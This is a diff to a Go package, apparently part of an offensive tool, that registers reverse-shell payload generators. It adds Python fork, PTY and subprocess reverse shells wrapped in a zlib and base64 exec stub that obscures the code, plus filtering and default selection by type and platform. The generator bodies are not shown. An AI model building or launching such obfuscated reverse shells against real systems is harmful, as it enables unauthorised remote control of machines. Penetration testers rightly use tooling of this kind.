@@ -1,5 +1,7 @@
 package payload
 
+import "strings"
+
 // GenerateFunc is a function that generates a payload command string.
 type GenerateFunc func(lhost string, lport int) string
 
@@ -7,7 +9,8 @@ type GenerateFunc func(lhost string, lport int) string
 type Info struct {
 	Name        string
 	Description string
-	Platform    string // "linux", "windows"
+	Type        string // "cmd", "py" - derived from name prefix
+	Platform    string // "linux", "windows", "" (cross-platform)
 	Generate    GenerateFunc
 }
 
@@ -17,6 +20,7 @@ func reg(name, desc, platform string, gen GenerateFunc) {
 	payloads = append(payloads, &Info{
 		Name:        name,
 		Description: desc,
+		Type:        name[:strings.Index(name, "/")],
 		Platform:    platform,
 		Generate:    gen,
 	})
@@ -70,6 +74,11 @@ func init() {
 	// Windows
 	reg("cmd/powershell/reverse_tcp", "PowerShell reverse shell", "windows", PowerShell)
 	reg("cmd/powershell/reverse_conpty", "PowerShell ConPTY reverse shell", "windows", PowerShellConPTY)
+
+	// Python exec() - raw Python code wrapped in zlib+b64 exec stub
+	reg("py/reverse_tcp", "Python fork+dup2 reverse shell (exec stub)", "linux", pyStub(PyReverseTCP))
+	reg("py/reverse_tcp_pty", "Python fork+PTY reverse shell (exec stub)", "linux", pyStub(PyReversePTY))
+	reg("py/reverse_tcp_subprocess", "Python subprocess reverse shell (exec stub)", "", pyStub(PyReverseSubprocess))
 }
 
 // ListPayloads returns all registered payloads.
@@ -77,13 +86,18 @@ func ListPayloads() []*Info {
 	return payloads
 }
 
-// ListForPlatform returns payloads compatible with the given platform.
-func ListForPlatform(platform string) []*Info {
+// ListFor returns payloads matching the given target type and platform.
+// Empty targetType or platform means "any".
+func ListFor(targetType, platform string) []*Info {
 	var result []*Info
 	for _, pl := range payloads {
-		if pl.Platform == platform || platform == "" {
-			result = append(result, pl)
+		if targetType != "" && pl.Type != targetType {
+			continue
 		}
+		if platform != "" && pl.Platform != "" && pl.Platform != platform {
+			continue
+		}
+		result = append(result, pl)
 	}
 	return result
 }
@@ -107,12 +121,22 @@ func Names() []string {
 	return result
 }
 
-// DefaultPayload returns the default payload for a platform.
-func DefaultPayload(platform string) *Info {
-	switch platform {
-	case "windows":
-		return GetPayload("cmd/powershell/reverse_tcp")
+// pyStub wraps a raw Python generator with PyExecStub.
+func pyStub(gen GenerateFunc) GenerateFunc {
+	return func(lhost string, lport int) string {
+		return PyExecStub(gen(lhost, lport))
+	}
+}
+
+// DefaultFor returns the default payload for a target type + platform.
+func DefaultFor(targetType, platform string) *Info {
+	switch targetType {
+	case "py":
+		return GetPayload("py/reverse_tcp")
 	default:
+		if platform == "windows" {
+			return GetPayload("cmd/powershell/reverse_tcp")
+		}
 		return GetPayload("cmd/bash/reverse_tcp")
 	}
 }
